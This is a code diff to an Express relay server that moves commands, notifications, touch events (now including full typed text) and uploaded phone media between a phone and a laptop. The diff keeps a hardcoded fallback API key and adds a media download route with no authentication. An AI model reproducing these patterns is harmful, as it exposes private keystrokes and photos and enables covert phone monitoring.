@@ -13,7 +13,7 @@ const API_KEY = process.env.API_KEY || 'Gokul_Secret_Agent_99';
 
 // Middleware
 app.use(cors());
-app.use(express.json({ limit: '5mb' }));
+app.use(express.json({ limit: '100mb' }));
 
 // Storage
 const commands = new Map();   // id -> {command, device, target_device, timestamp}
@@ -28,6 +28,12 @@ const ONLINE_WINDOW_MS = 20 * 1000; // device online if lastSeen < 20s ago
 const notifBatches = new Map();
 const NOTIF_BATCH_CAP = 200;   // per-device cap
 const NOTIF_ENTRY_CAP = 4000;  // per-upload entry char cap
+
+// v8.8: media store — phone uploads photos/videos/screenshots (base64) and the
+// laptop downloads them via a shareable URL. In-memory (Render free tier).
+const mediaStore = new Map();   // media_id -> {mime, data_b64, ts, filename}
+const MEDIA_CAP = 50;           // max stored files (FIFO eviction)
+const MEDIA_TTL_MS = 60 * 60 * 1000;  // 1 hour expiry
 
 // Dashboard stats (in-memory, reset on server restart)
 const startedAt = Date.now();
@@ -224,7 +230,7 @@ app.post('/mobile_result', authMiddleware, (req, res) => {
     if (device_id) touchDevice(device_id);
 
     results.set(id || 'legacy', {
-        result: String(result).slice(0, 2000000), // 2MB cap
+        result: String(result).slice(0, 20000000), // 20MB cap (was 2MB)
         device_id: device_id || null,
         timestamp: new Date().toISOString(),
     });
@@ -426,7 +432,10 @@ app.post('/touch_upload', authMiddleware, (req, res) => {
     res.json({ ok: true, stored: 1, device_id: deviceId });
 });
 
-// Laptop → Server: fetch latest pending touch batch (consume-once)
+// Laptop → Server: fetch latest pending touch batch (consume-once).
+// NOTE: the "admin-only" gate lives in the laptop tool (fetch_touch_events
+// checks admin_auth, same as life_log_read_private) — this stream now carries
+// full typed text + coordinates.
 app.get('/touch_fetch', authMiddleware, (req, res) => {
     const deviceId = req.query.device_id;
     if (deviceId && touchBatches.has(deviceId)) {
@@ -443,6 +452,46 @@ app.get('/touch_fetch', authMiddleware, (req, res) => {
     }
     touchBatches.clear();
     res.json({ entries: parts.join('\n'), count: n });
+});
+
+// ---------- v8.8: media upload + download link ----------
+
+// Phone → Server: upload a media file (base64) → get a download link back.
+app.post('/media_upload', authMiddleware, (req, res) => {
+    const deviceId = (req.body && req.body.device_id) || req.headers['x-device-id'] || 'legacy';
+    const data = (req.body && req.body.data_b64) || '';
+    const mime = (req.body && req.body.mime) || 'application/octet-stream';
+    const filename = (req.body && req.body.filename) || null;
+    if (!data) {
+        return res.status(400).json({ error: 'data_b64 is required' });
+    }
+    const id = crypto.randomUUID();
+    mediaStore.set(id, { mime, data, ts: Date.now(), filename, device_id: deviceId });
+    // FIFO eviction by cap + TTL
+    if (mediaStore.size > MEDIA_CAP) {
+        const oldest = mediaStore.keys().next().value;
+        mediaStore.delete(oldest);
+    }
+    for (const [mid, m] of mediaStore) {
+        if (Date.now() - m.ts > MEDIA_TTL_MS) mediaStore.delete(mid);
+    }
+    touchDevice(deviceId);
+    console.log(`[${new Date().toISOString()}] MEDIA upload ${deviceId}: ${mime} (${data.length} b64 chars)`);
+    res.json({ ok: true, media_id: id, url: `/media/${id}` });
+});
+
+// Laptop → Server: download a media file by id (binary, for browser/download).
+// No auth middleware (so the shareable URL opens in a plain browser/download).
+app.get('/media/:id', (req, res) => {
+    const m = mediaStore.get(req.params.id);
+    if (!m) {
+        return res.status(404).send('media not found or expired');
+    }
+    if (m.filename) {
+        res.set('Content-Disposition', `inline; filename="${String(m.filename).replace(/"/g, '')}"`);
+    }
+    res.set('Content-Type', m.mime);
+    res.send(Buffer.from(m.data, 'base64'));
 });
 
 // Start
